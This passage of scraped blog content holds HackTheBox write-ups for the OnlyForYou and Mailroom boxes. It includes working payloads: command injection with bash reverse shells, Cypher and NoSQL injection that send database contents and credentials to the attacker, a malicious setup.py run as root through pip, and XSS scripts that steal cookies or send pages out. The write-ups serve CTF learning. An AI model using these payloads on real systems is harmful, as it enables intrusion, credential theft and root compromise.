\u0026#34;image=/var/www/only4you.htb/app.py\u0026#34; Source code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 from flask import Flask, render_template, request, flash, redirect from form import sendmessage import uuid app = Flask(__name__) app.secret_key = uuid.uuid4().hex @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def index(): if request.method == \u0026#39;POST\u0026#39;: email = request.form[\u0026#39;email\u0026#39;] subject = request.form[\u0026#39;subject\u0026#39;] message = request.form[\u0026#39;message\u0026#39;] ip = request.remote_addr status = sendmessage(email, subject, message, ip) if status == 0: flash(\u0026#39;Something went wrong!\u0026#39;, \u0026#39;danger\u0026#39;) elif status == 1: flash(\u0026#39;You are not authorized!\u0026#39;, \u0026#39;danger\u0026#39;) else: flash(\u0026#39;Your message was successfuly sent! We will reply as soon as possible.\u0026#39;, \u0026#39;success\u0026#39;) return redirect(\u0026#39;/#contact\u0026#39;) else: return render_template(\u0026#39;index.html\u0026#39;) @app.errorhandler(404) def page_not_found(error): return render_template(\u0026#39;404.html\u0026#39;), 404 @app.errorhandler(500) def server_errorerror(error): return render_template(\u0026#39;500.html\u0026#39;), 500 @app.errorhandler(400) def bad_request(error): return render_template(\u0026#39;400.html\u0026#39;), 400 @app.errorhandler(405) def method_not_allowed(error): return render_template(\u0026#39;405.html\u0026#39;), 405 if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;127.0.0.1\u0026#39;, port=80, debug=False) We don\u0026rsquo;t see much here, but take a look at the imports associated. flask is a standard python module for web servers, and uuid is also commonly within the library. However, form is very generic and does not exist in the pip library. This is likely coming from another python file somewhere. Since non-library imports follow current working directory schema, we know that form.py will also exist in this same folder. If, perhaps, it existed in tools/form.py, we would see the import line reflect this: from tools.form import sendmessage.\nViewing form.py:\n1 $ curl http://beta.only4you.htb/download -d \u0026#34;image=/var/www/only4you.htb/form.py\u0026#34; Full code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 import smtplib, re from email.message import EmailMessage from subprocess import PIPE, run import ipaddress def issecure(email, ip): if not re.match(\u0026#34;([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\\.[A-Z|a-z]{2,})\u0026#34;, email): return 0 else: domain = email.split(\u0026#34;@\u0026#34;, 1)[1] result = run([f\u0026#34;dig txt {domain}\u0026#34;], shell=True, stdout=PIPE) output = result.stdout.decode(\u0026#39;utf-8\u0026#39;) if \u0026#34;v=spf1\u0026#34; not in output: return 1 else: domains = [] ips = [] if \u0026#34;include:\u0026#34; in output: dms = \u0026#39;\u0026#39;.join(re.findall(r\u0026#34;include:.*\\.[A-Z|a-z]{2,}\u0026#34;, output)).split(\u0026#34;include:\u0026#34;) dms.pop(0) for domain in dms: domains.append(domain) while True: for domain in domains: result = run([f\u0026#34;dig txt {domain}\u0026#34;], shell=True, stdout=PIPE) output = result.stdout.decode(\u0026#39;utf-8\u0026#39;) if \u0026#34;include:\u0026#34; in output: dms = \u0026#39;\u0026#39;.join(re.findall(r\u0026#34;include:.*\\.[A-Z|a-z]{2,}\u0026#34;, output)).split(\u0026#34;include:\u0026#34;) domains.clear() for domain in dms: domains.append(domain) elif \u0026#34;ip4:\u0026#34; in output: ipaddresses = \u0026#39;\u0026#39;.join(re.findall(r\u0026#34;ip4:+[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+[/]?[0-9]{2}\u0026#34;, output)).split(\u0026#34;ip4:\u0026#34;) ipaddresses.pop(0) for i in ipaddresses: ips.append(i) else: pass break elif \u0026#34;ip4\u0026#34; in output: ipaddresses = \u0026#39;\u0026#39;.join(re.findall(r\u0026#34;ip4:+[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+[/]?[0-9]{2}\u0026#34;, output)).split(\u0026#34;ip4:\u0026#34;) ipaddresses.pop(0) for i in ipaddresses: ips.append(i) else: return 1 for i in ips: if ip == i: return 2 elif ipaddress.ip_address(ip) in ipaddress.ip_network(i): return 2 else: return 1 def sendmessage(email, subject, message, ip): status = issecure(email, ip) if status == 2: msg = EmailMessage() msg[\u0026#39;From\u0026#39;] = f\u0026#39;{email}\u0026#39; msg[\u0026#39;To\u0026#39;] = \u0026#39;info@only4you.htb\u0026#39; msg[\u0026#39;Subject\u0026#39;] = f\u0026#39;{subject}\u0026#39; msg[\u0026#39;Message\u0026#39;] = f\u0026#39;{message}\u0026#39; smtp = smtplib.SMTP(host=\u0026#39;localhost\u0026#39;, port=25) smtp.send_message(msg) smtp.quit() return status elif status == 1: return status else: return status Foothold Command Injection vulnerability in message form Within issecure, the re.match follows a rather complex regex. To get a more thorough understanding as to what is passing or failing, the simplest approach is to use a regex matcher\nWe can see we need a string of letters or numbers (one .- or _ allowed), followed by a @, another string of letters or numbers, followed by a ., then at least 2 more letters to pass. The next interesting component is the operations domain and result. Our query is split by the @ symbol, and the second field is run through a dig:\n1 2 domain = email.split(\u0026#34;@\u0026#34;, 1)[1] result = run([f\u0026#34;dig txt {domain}\u0026#34;], shell=True, stdout=PIPE) Since the regex is not performing any filtering, we can add whatever we want following our valid asdf@asf.com, and this will enter the dig command. Using this, we can abuse command injections:\n1 $ curl http://only4you.htb/ -d \u0026#34;email=asdf@asdf.com;%20curl%2010.10.14.139\u0026amp;subject=\u0026amp;message=\u0026#34; Meanwhile on my listener:\n1 2 3 4 5 6 7 $ nc -nvlp 80 listening on [any] 80 ... connect to [10.10.14.139] from (UNKNOWN) [10.10.11.210] 42580 GET / HTTP/1.1 Host: 10.10.14.139 User-Agent: curl/7.68.0 Accept: */* We can use this to spawn a reverse shell:\n1 bash -c \u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.139/8888 0\u0026gt;\u0026amp;1 payload:\n1 $ curl http://only4you.htb/ -d \u0026#34;email=asdf@asdf.com;%3b+bash+-c+\u0026#39;/bin/bash+-i+\u0026gt;%26+/dev/tcp/10.10.14.139/8888+0\u0026gt;%261\u0026#39;\u0026amp;subject=\u0026amp;message=\u0026#34; On listener:\n1 2 3 4 5 $ nc -nvlp 8888 listening on [any] 8888 ... connect to [10.10.14.139] from (UNKNOWN) [10.10.11.210] 54938 whoami www-data Enumerating the system as www-data Running netstat, we find unusual ports open:\n1 2 3 4 5 6 7 8 9 www-data@only4you:/$ netstat -ano Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State Timer tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN off (0.00/0/0) tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN off (0.00/0/0) tcp 0 0 127.0.0.1:3000 0.0.0.0:* LISTEN off (0.00/0/0) tcp 0 0 127.0.0.1:8001 0.0.0.0:* LISTEN off (0.00/0/0) tcp 0 0 127.0.0.1:33060 0.0.0.0:* LISTEN off (0.00/0/0) tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN off (0.00/0/0) These ports can be viewed internally via chisel. Placing chisel on the box:\n1 2 3 4 5 6 7 8 9 10 11 12 www-data@only4you:/tmp$ wget 10.10.14.139/chisel --2023-Apr-23 15:11:50-- http://10.10.14.139/chisel Connecting to 10.10.14.139:80... connected. HTTP request sent, awaiting response... 200 OK Length: 8654848 (8.3M) [application/octet-stream] Saving to: ‘chisel’ chisel 100%[===================\u0026gt;] 8.25M 1.28MB/s in 7.4s 2023-04-23 15:11:58 (1.12 MB/s) - ‘chisel’ saved [8654848/8654848] www-data@only4you:/tmp$ Setting up chisel on kali:\n1 $ ./chisel server -p 8000 --reverse On only4you:\n1 2 www-data@only4you:/tmp$ chmod +x chisel www-data@only4you:/tmp$ ./chisel client 10.10.14.139:8000 R:3000:127.0.0.1:3000 Now we can visit localhost:3000 in our browser, and view the page on only4you listening at port 3000:\nWe can see an internal git service. There is another interesting port at 8001, but for now let\u0026rsquo;s take a look at this page\nWe see two users viewable, john and administrator:\nThere are no repositories veiwable unfortunately, so it might be best to return to this after credentials are acquired.\nTo view the 8001 page, we must resubmit a new chisel client:\n1 www-data@only4you:/tmp$ ./chisel client 10.10.14.139:8000 R:8001:127.0.0.1:8001 We see yet another login frontpage:\nFortunately though, this one is different. We can get in with the very simple credentials, admin:admin !\nViewing the dashboard, there is interesting information in the task checklist of the corner:\nIt mentions the database is migrated over to neo4j, and selecting the employees tab on the left-hand side immediately shows us how we might interact with the database.\nIt looks like we can dump the entire table with a blank search, but how might we exploit this kind of database?\nCypher Injection vulnerability in neo4j Fortunately, hacktricks has a page dedicated to cypher injection.\nProbing which injectable query is being used was quite a pain, as it will often result in 500 error or no change. Eventually, however, I found a payload in which the server will send database information to my own listener: search payload:\n1 \u0026#39; OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM \u0026#39;http://10.10.14.139/?version=\u0026#39; + version + \u0026#39;\u0026amp;name=\u0026#39; + name + \u0026#39;\u0026amp;edition=\u0026#39; + edition as l RETURN 0 as _0 // On my listener:\n1 2 3 4 $ python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.210 - - [22/Apr/2023 21:44:31] code 400, message Bad request syntax (\u0026#39;GET /?version=5.6.0\u0026amp;name=Neo4j Kernel\u0026amp;edition=community HTTP/1.1\u0026#39;) 10.10.11.210 - - [22/Apr/2023 21:44:31] \u0026#34;GET /?version=5.6.0\u0026amp;name=Neo4j Kernel\u0026amp;edition=community HTTP/1.1\u0026#34; 400 - This current payload only produces the neo4j version, name, and edition. However, it we\u0026rsquo;re looking for a way to dump all information on the database. Now that the injection is established, surely it won\u0026rsquo;t be too hard? Eventually I learn to dump databases:\n1 \u0026#39; OR 1=1 WITH 1 as a CALL db.labels() YIELD label AS d LOAD CSV FROM \u0026#39;http://10.10.14.139/?d=\u0026#39; + d AS y RETURN y// On listener:\n1 2 3 4 $ python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.210 - - [22/Apr/2023 23:48:22] \u0026#34;GET /?d=user HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [22/Apr/2023 23:48:22] \u0026#34;GET /?d=employee HTTP/1.1\u0026#34; 200 - Employee is likely the data we are already viewing, and user likely has the login credentials we are seeking. After trying once again for several hours, I finally generate a payload that can dump the contents:\n1 \u0026#39; OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM \u0026#39;http://10.10.14.139/?\u0026#39; + p +\u0026#39;=\u0026#39;+toString(f[p]) as l RETURN 0 as _0 // On listener:\n1 2 3 4 5 6 $ python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.210 - - [23/Apr/2023 14:20:22] \u0026#34;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 14:20:22] \u0026#34;GET /?username=admin HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 14:20:23] \u0026#34;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 14:20:23] \u0026#34;GET /?username=john HTTP/1.1\u0026#34; 200 - we know one pair of creds as admin:admin, but the other one is interesting: john:a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6\nFortunately this cracks in a popular online rainbow table:\nWe now have credentials as john:ThisIs4You.\nPrivilege Escalation Enumerating as user john Now wish ssh, we can tunnel without the need for chisel\n1 $ ssh -D 1080 john@only4you.htb We can return back to the gog server, and possibly login with john\nThere is 1 repository as Test, but there doesn\u0026rsquo;t seem to be anything interesting here.\nChecking sudo privileges:\n1 2 3 4 5 6 7 john@only4you:~$ sudo -l Matching Defaults entries for john on only4you: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User john may run the following commands on only4you: (root) NOPASSWD: /usr/bin/pip3 download http\\://127.0.0.1\\:3000/*.tar.gz Abusing pip3 download to execute commands as root It looks like we can use pip3 to download any repository zip as root. When researching what can be done about this, I find this article, Malicious Python Packages and Code Execution via pip download. It seems that when pip is downloading/installing, setup.py is executed and in our case, will be done so as root. This allows us to supply malicious code in setup.py, and we can perform privilege escalation.\nZipping the repo seems rather complicated, so I just cloned the repo, edited my paylod into setup.py, and followed instructions to comress/build:\n1 $ git clone https://github.com/wunderwuzzi23/this_is_fine_wuzzi/ changes to setup.py:\n1 2 3 4 5 6 7 8 9 10 from setuptools import setup, find_packages from setuptools.command.install import install from setuptools.command.egg_info import egg_info import os def RunCommand(): os.system(\u0026#34;bash -c \u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.139/8888 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;) class RunEggInfoCommand(egg_info): \u0026lt;...SNIP...\u0026gt; Building:\n1 2 3 4 5 6 7 8 9 $ python -m build \u0026lt;...SNIP...\u0026gt; adding \u0026#39;this_is_fine_wuzzi-0.0.1.dist-info/LICENSE\u0026#39; adding \u0026#39;this_is_fine_wuzzi-0.0.1.dist-info/METADATA\u0026#39; adding \u0026#39;this_is_fine_wuzzi-0.0.1.dist-info/WHEEL\u0026#39; adding \u0026#39;this_is_fine_wuzzi-0.0.1.dist-info/top_level.txt\u0026#39; adding \u0026#39;this_is_fine_wuzzi-0.0.1.dist-info/RECORD\u0026#39; removing build/bdist.linux-x86_64/wheel Successfully built this_is_fine_wuzzi-0.0.1.tar.gz and this_is_fine_wuzzi-0.0.1-py3-none-any.whl This produces a whl and a .tar.gz file:\n1 2 3 $ cd dist $ ls this_is_fine_wuzzi-0.0.1-py3-none-any.whl this_is_fine_wuzzi-0.0.1.tar.gz Uploading file:\nRunning the sudo command:\n1 2 3 4 5 john@only4you:~$ sudo /usr/bin/pip3 download http\\://127.0.0.1\\:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz Collecting http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz ERROR: HTTP error 404 while getting http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz ERROR: Could not install requirement http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz because of error 404 Client Error: Not Found for url: http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz ERROR: Could not install requirement http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz because of HTTP error 404 Client Error: Not Found for url: http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz for URL http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz It appears that the download fails, because the url is unreachable? After exploring a little more, I remember that the repo was only visible after logging in. In order for this url to work (without cookies/login credentials), then it needs to be public:\nNow, executing the sudo command:\n1 2 3 4 5 6 john@only4you:~$ sudo /usr/bin/pip3 download http\\://127.0.0.1\\:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz Collecting http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz Downloading http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz - 2.8 kB 10.1 MB/s Saved ./this_is_fine_wuzzi-0.0.1.tar.gz Successfully downloaded this-is-fine-wuzzi Meanwhile on my listener:\n1 2 3 4 5 6 7 $ nc -nvlp 8888 listening on [any] 8888 ... connect to [10.10.14.139] from (UNKNOWN) [10.10.11.210] 34386 root@only4you:/tmp/pip-req-build-3yl3w6ls# whoami whoami root root@only4you:/tmp/pip-req-build-3yl3w6ls# The exploit worked, and now we have full access as root.\nReflection This box felt particularly well-earned as the Cypher Injection segment ended up being a nightmare. An entirely unfamiliar database language, coupled with every injection attempt respond with error 500. It turned into a great learning experience, with a lot of skills/techniques challenged throughout the box. As usual, I found Privilege escalation, the abuse of sudo pip3 download, to be a really cool highlight of a method I had not known.\n","date":"2023-08-26T12:27:15-05:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-onlyforyou/OnlyForYou_hub67fe2f1a37b4ddd8d67f8b532b1624d_359490_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-onlyforyou/","title":"HackTheBox - OnlyForYou"},{"content":"Enumeration initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.93 scan initiated Sun Apr 16 09:30:53 2023 as: nmap -sCV -p 22,80 -oN nmap_scriptports.txt 10.129.208.171 Nmap scan report for 10.129.208.171 Host is up (0.017s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 94bb2ffcaeb9b182afd789811aa76ce5 (RSA) | 256 821beb758b9630cf946e7957d9ddeca7 (ECDSA) |_ 256 19fb45feb9e4275de5bbf35497dd68cf (ED25519) 80/tcp open http Apache httpd 2.4.54 ((Debian)) |_http-title: The Mail Room |_http-server-header: Apache/2.4.54 (Debian) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Apr 16 09:31:00 2023 -- 1 IP address (1 host up) scanned in 7.58 seconds XSS vulnerability found in contact submission form Exploring the webpages, we find a contact page that allows us to submit questions.\nSubmitting a query suggests it might be viewed by an admin:\nThis has potential for XSS, and since we can view it ourselves we can do an easy check:\n1 \u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; We see successful alert message. XSS is possible. From here we can possibly grab admin information such as cookies? Using xss payload:\n1 \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt;document.location=\u0026#34;http://10.10.14.35/?c=\u0026#34;+document.cookie;\u0026lt;/script\u0026gt; On attacker machine:\n1 2 3 4 5 6 7 8 9 10 11 12 $ nc -nvlp 80 listening on [any] 80 ... connect to [10.10.14.35] from (UNKNOWN) [10.129.209.135] 54046 GET /?c= HTTP/1.1 Host: 10.10.14.35 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://127.0.0.1/ Connection: keep-alive Upgrade-Insecure-Requests: 1 Sensitive Gitea repository accessible in a subdomain The machine successfully reaches out, but we don\u0026rsquo;t see any cookies. While exploring this, I had also ran subdomain enumeration:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ gobuster vhost -u http://mailroom.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://mailroom.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt [+] User Agent: gobuster/3.5 [+] Timeout: 10s [+] Append Domain: true =============================================================== 2023/04/16 10:45:43 Starting gobuster in VHOST enumeration mode =============================================================== Found: git.mailroom.htb Status: 200 [Size: 13201] We see a hit for http://git.mailroom.htb so let\u0026rsquo;s explore this site for now\nExploring around without signing in, we can see a public repo for matthew named staffroom.\nIn the auth.php file, we can see a change noted as \u0026ldquo;fixed path bug \u0026amp; email spam\u0026rdquo;. The change looks potentially interesting, so we can we can check the changes with this commit.\nInformation on a private subdomain is leaked The change is focused on not sending more 2fa requests if a minute has not passed. However, it is worth noting that we find yet another subdomain this way: http://staff-review-panel.mailroom.htb. Based on the sensitive nature of the title, we shouldn\u0026rsquo;t expect to be able to access this page externally or without credentials. Visitng the page shows that it is publicly accessible, but needs some additional authentication.\nFoothold Leveraging XSS to reach the private subdomain Recalling the XSS trick discovered earlier, we were able to redirect someone\u0026rsquo;s or something\u0026rsquo;s session back to our machine, although there were no cookies for that main site. Perhaps this exploited session is able to access this subdomain for us?\nThis exploit idea is also covered in write-ups for crossfit, an insane difficulty box previously retired. The idea is to abuse XSS to perform requests as an authorized user, then relay the information back to our machine in the form of http post requests.\nInstead of crafting a new XSS payload every time, it is easier to write an XSS that retrieves a script from our local machine and then executes it: \u0026lt;script src=\u0026quot;http://10.10.14.35/at.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\nTo make the process even more simple, we can write the request as a curl request. Burp Repeater is good for this as well:\n1 curl -X POST http://mailroom.htb/contact.php -d \u0026#34;email=\u0026lt;script+src%3d\u0026#34;http%3a//10.10.14.35/at.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026amp;title=a\u0026amp;message=a\u0026#34; Now when the XSS activates, it will reach back to our attacker address 10.10.14.35 and execute script from at.js. I can easily make quick edits to at.js and send another curl to execute a new command. at.js (inspired from 0xdf\u0026rsquo;s crossfit writeup):\n1 2 3 4 5 6 7 8 9 10 11 var fetch_req = new XMLHttpRequest(); fetch_req.onreadystatechange = function() { if(fetch_req.readyState == XMLHttpRequest.DONE) { var exfil_req = new XMLHttpRequest(); exfil_req.open(\u0026#34;POST\u0026#34;, \u0026#34;http://10.10.14.35:9001\u0026#34;, false); exfil_req.send(\u0026#34;Resp Code: \u0026#34; + fetch_req.status + \u0026#34;\\nPage Source:\\n\u0026#34; + fetch_req.response); } }; fetch_req.open(\u0026#34;GET\u0026#34;, \u0026#34;http://staff-review-panel.mailroom.htb/\u0026#34;, false); fetch_req.setRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); fetch_req.send(); In this script, we have a GET request pointed at staff-review-panel, then the content is sent back to our attacking machine, port 9001 as a POST.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ nc -vlp 9001 listening on [any] 9001 ... connect to [10.10.14.35] from (UNKNOWN) [10.10.11.209] 33536 POST / HTTP/1.1 Host: 10.10.14.35:9001 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://127.0.0.1/ Content-Type: text/plain;charset=UTF-8 Content-Length: 2399 Origin: http://127.0.0.1 Connection: keep-alive Resp Code: 200 Page Source: \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;...SNIP...\u0026gt; Examining the source code a little we can find that it actually matches the gitea staffroom code. Perhaps we can access auth.php from here?\n1 2 3 fetch_req.open(\u0026#34;GET\u0026#34;, \u0026#34;http://staff-review-panel.mailroom.htb/auth.php\u0026#34;, false); fetch_req.setRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); fetch_req.send(); We are able to access:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ nc -nvlp 9001 listening on [any] 9001 ... connect to [10.10.14.35] from (UNKNOWN) [10.10.11.209] 58294 POST / HTTP/1.1 Host: 10.10.14.35:9001 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://127.0.0.1/ Content-Type: text/plain;charset=UTF-8 Content-Length: 89 Origin: http://127.0.0.1 Connection: keep-alive Resp Code: 400 Page Source: {\u0026#34;success\u0026#34;:false,\u0026#34;message\u0026#34;:\u0026#34;Email and password are required\u0026#34;} It looks like we need to submit a valid username/password combination.\nAbusing NoSQL injection to leak credentials The Gitea source code tells us this is mongodb, so when I explore noSQL injection, we see that this is vulnerable:\nedits in at.js\n1 2 3 fetch_req.open(\u0026#34;POST\u0026#34;, \u0026#34;http://staff-review-panel.mailroom.htb/auth.php\u0026#34;, false); fetch_req.setRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); fetch_req.send(\u0026#34;email[$ne]=asdf\u0026amp;password[$ne]=asdf\u0026#34;); response:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ nc -nvlp 9001 listening on [any] 9001 ... connect to [10.10.14.35] from (UNKNOWN) [10.10.11.209] 57972 POST / HTTP/1.1 Host: 10.10.14.35:9001 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://127.0.0.1/ Content-Type: text/plain;charset=UTF-8 Content-Length: 158 Origin: http://127.0.0.1 Connection: keep-alive Resp Code: 401 Page Source: {\u0026#34;success\u0026#34;:false,\u0026#34;message\u0026#34;:\u0026#34;Invalid input detected\u0026#34;}{\u0026#34;success\u0026#34;:true,\u0026#34;message\u0026#34;:\u0026#34;Check your inbox for an email with your 2FA token\u0026#34;} By labeling email and password as [$ne] or \u0026ldquo;not equal to\u0026rdquo; asdf, we bypass login. However, we can achieve the same results with vague regex statements. By abusing regex guesses, we can piece together a valid email and password combination, letter by letter:\n1 2 3 fetch_req.open(\u0026#34;POST\u0026#34;, \u0026#34;http://staff-review-panel.mailroom.htb/auth.php\u0026#34;, false); fetch_req.setRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); fetch_req.send(\u0026#34;email[$regex]=^t*\u0026amp;password[$ne]=asdf\u0026#34;); In the above code, I designate the start of the string as ^, guess the first letter, then wildcard the rest of the string with *. The regex will only pass when the guessed first letter is correct, the t. This method will take forever, so I used regex ranges to cover multiple letter guesses at once. By guessing half the alphabet in the first query, I can eliminate multiple letters that don\u0026rsquo;t fit. Not as fast as creating a script to automate this, but still saves considerable time:\n1 fetch_req.send(\u0026#34;email[$regex]=^t{a-m}.*\u0026amp;password[$ne]=asdf\u0026#34;); This regex fails, so we know the 2nd letter is between n-z.\nAfter some time, we finally get the full email: tristan@mailroom.htb. Now we can do the same for passwords, but it\u0026rsquo;s good to remember the characters might also be capitalized, numeric, or a special char. In this case, I start by setting the regex for all uppercase letters:\n1 fetch_req.send(\u0026#34;email=tristan@mailroom.htb\u0026amp;password[$regex]=^{A-Z}.*\u0026#34;); The first letter is not an uppercase letter, and a second query shows it is neither a lowercase letter. Next we can check any single digit number:\n1 fetch_req.send(\u0026#34;email=tristan@mailroom.htb\u0026amp;password[$regex]=^[0-9].*\u0026#34;); Eventually, we can leak the full password as well. Now we have credentials:\n1 email=tristan@mailroom.htb\u0026amp;password=69trisRulez! With this, we can access the machine through ssh:\n1 2 3 4 5 6 7 8 9 10 $ ssh tristan@mailroom.htb The authenticity of host \u0026#39;mailroom.htb (10.10.11.209)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:c4alO/6TY4cZRWE6/Mr+rsUQ3AXFKUZDWmSifHVp9pQ. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;mailroom.htb\u0026#39; (ED25519) to the list of known hosts. tristan@mailroom.htb\u0026#39;s password: \u0026lt;...SNIP...\u0026gt; You have mail. tristan@mailroom:~$ Access as user tristan Enumerating the private webpage directly through port forwarding The ssh banner also tells us we have mail, which is will be the 2FA notifications we have been sending during our mongoDB regex adventures.\n1 2 3 4 5 6 7 8 9 10 tristan@mailroom:/var/mail$ cat tristan Return-Path: \u0026lt;noreply@mailroom.htb\u0026gt; X-Original-To: tristan@mailroom.htb Delivered-To: tristan@mailroom.htb Received: from localhost (unknown [172.19.0.5]) by mailroom.localdomain (Postfix) with SMTP id 14BBF1AEC for \u0026lt;tristan@mailroom.htb\u0026gt;; Sun, 16 Apr 2023 18:02:03 +0000 (UTC) Subject: 2FA Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=2a5bb5f3da937782b46ce69491f7c485 With our ssh capabilities, we can do SSH tunneling now to visit the internal staff-review-panel without the XSS hassle.\n1 $ ssh -D 1080 tristan@mailroom.htb Visiting the webpage, we see the same login that we have been using, this time in a browser setting:\nlet\u0026rsquo;s try pasting in the link that they send us from the email:\nFinally we are in. We can see some recent activities, using an identifier that looks to be some kind of hash.\nChecking the inspect page, we can view queries through once again broad regex terms\nThere are no other interesting messages. Looking at the source code for this page (again, this is the same code repository located on the git.mailroom.htb site), we can see how this command is being done, through a shell exec command:\n1 2 3 4 $data = \u0026#39;\u0026#39;; if (isset($_POST[\u0026#39;inquiry_id\u0026#39;])) { $inquiryId = preg_replace(\u0026#39;/[\\$\u0026lt;\u0026gt;;|\u0026amp;{}\\(\\)\\[\\]\\\u0026#39;\\\u0026#34;]/\u0026#39;, \u0026#39;\u0026#39;, $_POST[\u0026#39;inquiry_id\u0026#39;]); $contents = shell_exec(\u0026#34;cat /var/www/mailroom/inquiries/$inquiryId.html\u0026#34;); Remote Code Execution through Command Injection While there is some filtering done with the preg_replace function, it is not thorough enough. We can execute commands nested in this through use of the backtick, `.\nWhen we execute this, we find a connection on our local kali:\n1 2 3 4 5 6 7 $ nc -vlp 80 